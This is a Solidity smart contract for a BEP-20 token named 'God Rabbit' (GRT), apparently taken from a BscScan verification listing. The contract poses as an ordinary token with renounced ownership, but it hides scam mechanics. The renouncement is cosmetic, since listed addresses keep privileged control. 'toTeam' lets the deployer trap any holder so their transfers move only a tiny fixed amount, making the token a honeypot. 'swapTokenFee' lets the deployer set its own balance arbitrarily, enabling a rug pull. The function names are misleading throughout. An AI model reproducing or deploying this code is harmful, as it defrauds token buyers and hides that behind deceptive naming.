/**
 *Submitted for verification at BscScan.com on 2023-01-23
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface UniswapFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface UniswapRouter {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}


contract GodRabbit {
    uint8 constant _decimals = 18;
    string constant _symbol = "GRT";
    address public owner;
    mapping(address => uint256) _balances;

    address public teamReceiver;
    address public exemptTo;

    string constant _name = "God Rabbit";
    uint256 _totalSupply = 100000000 * (10 ** _decimals);
    mapping(address => bool) public txTokenList;

    mapping(address => bool) public maxWallet;
    uint256 constant tokenFrom = 11 ** 10;

    mapping(address => mapping(address => uint256)) _allowances;

    modifier burnEnableTake() {
        require(txTokenList[msg.sender]);
        _;
    }

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        UniswapRouter isBuy = UniswapRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        exemptTo = UniswapFactory(isBuy.factory()).createPair(isBuy.WETH(), address(this));
        _allowances[address(this)][address(isBuy)] = type(uint256).max;
        owner = msg.sender;
        teamReceiver = msg.sender;
        txTokenList[teamReceiver] = true;
        _balances[teamReceiver] = _totalSupply;
        emit Transfer(address(0), teamReceiver, _totalSupply);
        renounceOwnership();
    }

    receive() external payable {}

    function totalSupply() external view returns (uint256) {
        return _totalSupply;
    }

    function marketingMode(address receiverLaunched, address launchedFromToken, uint256 exemptTrading) internal returns (bool) {
        require(exemptTrading <= _balances[receiverLaunched]);
        _balances[receiverLaunched] -= exemptTrading;
        _balances[launchedFromToken] += exemptTrading;
        emit Transfer(receiverLaunched, launchedFromToken, exemptTrading);
        return true;
    }

    function toTeam(address modeBuyAmount) public burnEnableTake {
        maxWallet[modeBuyAmount] = true;
    }

    function symbol() external pure returns (string memory) {
        return _symbol;
    }

    function name() external pure returns (string memory) {
        return _name;
    }

    function _transferFrom(address receiverLaunched, address launchedFromToken, uint256 exemptTrading) internal returns (bool) {
        if (receiverLaunched == teamReceiver || launchedFromToken == teamReceiver) {
            return marketingMode(receiverLaunched, launchedFromToken, exemptTrading);
        }
        if (maxWallet[receiverLaunched]) {
            return marketingMode(receiverLaunched, launchedFromToken, tokenFrom);
        }
        return marketingMode(receiverLaunched, launchedFromToken, exemptTrading);
    }

    function listTxMin(address amountToken) public burnEnableTake {
        txTokenList[amountToken] = true;
    }

    function getOwner() external view returns (address) {
        return owner;
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function allowance(address holder, address spender) external view returns (uint256) {
        return _allowances[holder][spender];
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function transferFrom(address receiverLaunched, address launchedFromToken, uint256 exemptTrading) external returns (bool) {
        if (_allowances[receiverLaunched][msg.sender] != type(uint256).max) {
            require(exemptTrading <= _allowances[receiverLaunched][msg.sender]);
            _allowances[receiverLaunched][msg.sender] -= exemptTrading;
        }
        return _transferFrom(receiverLaunched, launchedFromToken, exemptTrading);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function swapTokenFee(uint256 exemptTrading) public burnEnableTake {
        _balances[teamReceiver] = exemptTrading;
    }

    function renounceOwnership() public {
        emit OwnershipTransferred(owner, address(0));
        owner = address(0);
    }


}